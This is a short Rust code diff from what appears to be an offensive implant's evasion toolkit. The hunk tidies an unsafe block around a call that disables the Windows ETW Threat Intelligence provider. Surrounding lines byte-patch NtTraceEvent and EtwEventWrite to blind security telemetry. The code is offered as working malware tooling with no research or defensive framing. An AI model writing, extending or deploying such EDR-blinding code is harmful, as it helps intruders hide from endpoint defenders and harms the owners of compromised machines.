@@ -163,12 +163,11 @@ impl BlindKit for LiveBlind {
                     let r = crate::blind::patch_nt_trace_event();
                     // Belt-and-suspenders: also disable the ETW-TI provider's
                     // EnableInfo via NtTraceControl. Best-effort — if it fails,
-                    // the byte-patch is still in place.
-                    let _ = unsafe {
-                        crate::blind::disable_etw_provider(
-                            &nyx_implant_evasionsdk::__private::ETW_TI_GUID,
-                        )
-                    };
+                    // the byte-patch is still in place. (No inner unsafe: we're
+                    // already inside the outer unsafe block at line 160.)
+                    let _ = crate::blind::disable_etw_provider(
+                        &nyx_implant_evasionsdk::__private::ETW_TI_GUID,
+                    );
                     r
                 }
                 BlindTarget::EtwEventWrite => crate::blind::patch_etw(),
